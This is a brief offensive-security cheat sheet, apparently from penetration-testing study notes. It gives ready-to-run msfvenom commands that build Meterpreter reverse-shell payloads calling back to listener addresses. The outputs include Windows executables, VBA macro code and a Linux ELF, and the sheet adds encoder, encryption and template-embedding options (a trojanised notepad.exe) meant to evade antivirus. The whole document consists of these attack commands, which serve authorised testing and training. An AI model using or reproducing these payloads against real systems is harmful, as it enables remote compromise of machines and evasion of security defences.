## Msfvenom Payloads
Staged & Non-staged payloads

```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfnonstaged.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
```
Macro - VBA 
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 EXITFUNC=thread -f vbapplication
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 EXITFUNC=thread -f vba
```

Encoders 
```
msfvenom --list encoders
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
```

Encryptors 
```
msfvenom --list encrypt
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o met64_aes.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.45.201 lport=443 --encrypt xor -e x86/xor_dynamic -f elf -o met.elf
    set EnableStageEncoding true
    set StageEncoder xor 
```
